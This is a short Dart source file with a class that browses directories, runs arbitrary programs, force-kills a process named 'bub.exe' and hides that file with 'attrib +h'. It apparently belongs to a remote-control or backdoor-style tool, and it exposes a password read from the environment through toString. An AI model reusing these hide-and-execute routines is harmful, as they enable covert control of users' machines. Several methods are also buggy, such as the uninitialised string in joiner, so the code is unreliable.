import 'dart:io';

import 'package:file/local.dart';
import 'package:shell/shell.dart';

class Traverslar {
  var fs = const LocalFileSystem();
  var shell = Shell();
  var password = Platform.environment['PASSWORD'];

  Future<String> changeDir({String path}) async {
    String val;
    try {
      shell.navigate(path);
      await getCurrentDir();
    } catch (e) {}
    return val;
  }

  getUserInfo() {}

  Future<String> getListFiles() async {
    try {
      var dir = await getCurrentDir();
      var files = await fs.directory(dir);
      var listFile = await files.listSync(recursive: false, followLinks: false);
      return listFile.toString();
    } catch (e) {
      print(e);
    }
  }

  Future<String> getCurrentDir() async {
    return await shell.workingDirectory;
  }

  // ignore: missing_return
  Future<File> getFile(String filename) async {
    try {
      print(filename.split('\\'));
      return await File(filename.toString());
    } catch (e) {
      return null;
    }
  }

  Future<String> joiner(String path) async {
    List step2 = path.split('\\"');
    String result;
    for (var i = 0; i < step2.length; i++) {
      result += step2[i] + '"\\"';
    }
    return result;
  }

  Future<String> excuteProgram(String path) async {
    try {
      await shell.run(path, []);
      return '$path  Running';
    } catch (e) {
      return '$path is not runnig';
    }
  }

  Future killProgrm() async {
    await shell.run('taskkill /IM "bub.exe" /F', []);
  }

  Future hideFile() async {
    await shell.run('attrib +h bub.exe', []);
  }

  @override
  bool operator ==(Object o) {
    if (identical(this, o)) return true;

    return o is Traverslar && o.password == password;
  }

  @override
  int get hashCode => password.hashCode;

  @override
  String toString() => 'Traverslar(password: $password)';
}
